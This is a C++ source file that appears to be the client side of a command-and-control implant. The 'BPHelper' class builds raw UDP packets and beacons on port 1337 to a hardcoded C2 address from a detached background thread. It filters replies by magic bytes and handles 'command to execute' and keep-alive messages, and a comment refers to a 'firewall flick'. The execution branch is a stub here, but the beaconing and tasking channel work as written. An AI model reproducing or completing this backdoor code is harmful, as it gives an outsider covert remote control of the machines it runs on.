#include "BPHelper.hpp"

using namespace PacketParse;
using namespace std;

int BPHelper::actionResponse(unique_ptr<info_t> eventInfo) {
    switch (eventInfo->bpHeader.header_type) {
        case 0x02:
            //execute command then respond
            cout << "Received a Command to Execute" << endl;
            if (eventInfo->bpRawCommand.command_num == currentCmd) {
                currentCmd++;
            }
            return 1;
        case 0x04:
            //keep alive for future use
            cout << "Received a Keep Alive" << endl;
            if (eventInfo->bpKeepAlive.command_num == currentCmd) {
                currentCmd++;
            }
            return 1;
        default:
            cout << "Not a Command or Keep Alive" << endl;
            return -1;
    }
}

void BPHelper::requestAction() {
    bp_header_t bpHeader{};
    bp_command_request_t bp_command_request_header{};
    bpHeader.header_type = 0x01;
    bp_command_request_header.target_OS = 0x01;
    bp_command_request_header.command_num = htonl(currentCmd);

    auto bp_header_ptr = reinterpret_cast<unsigned char *>(&bpHeader);
    auto bp_ptr = reinterpret_cast<unsigned char *>(&bp_command_request_header);

    vector<uint8_t> payload(bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
    payload.insert(payload.end(), bp_ptr, bp_ptr + sizeof(bp_command_request_header));

#if defined(_WIN32) || defined(WIN32)
    vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                                            C2IP,
                                            1337,
                                            1337,
                                            payload);
    //Firewall Flick
    socketMutex.lock();
    rawSocket.send(req);
    socketMutex.unlock();
#else
    vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                                         C2IP,
                                         1337,
                                         1337,
                                         payload,
                                         rawSocket.getMac(),
                                         nextHopMac);
    socketMutex.lock();
    rawSocket.send(req);
    socketMutex.unlock();
#endif
}

BPHelper::BPHelper() {
#ifdef __unix__
    rawSocket = RawSocket(C2IP);
    if (useGateway) {
        nextHopMac = rawSocket.getMacOfIP(GatewayIP);
    } else {
        nextHopMac = rawSocket.getMacOfIP(ntohl(C2IP));
    }
#elif defined(_WIN32) || defined(WIN32)
    rawSocket = RawSocket(C2IP);
#endif
    currentCmd = 0;
}

void BPHelper::Receive() {
    while (true) {
        rawSocket.receive();
        Packet packet = rawSocket.getPacket();
        if (!packet.empty()) {
            unique_ptr<info_t> info = parsePacket(packet);
            if (info->bpHeader.magic_bytes == MAGIC_BYTES) {
                socketMutex.lock();
                //actionResponse(move(info));
                cout << move(info) << endl;
                socketMutex.unlock();
            }
        }
    }
}

void BPHelper::requestActionLoop(int interval) {
    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(interval));
        this->requestAction();
    }
}

void BPHelper::requestActionThread() {
    thread t1(&BPHelper::requestActionLoop, this, requestActionInterval);
    t1.detach();
}


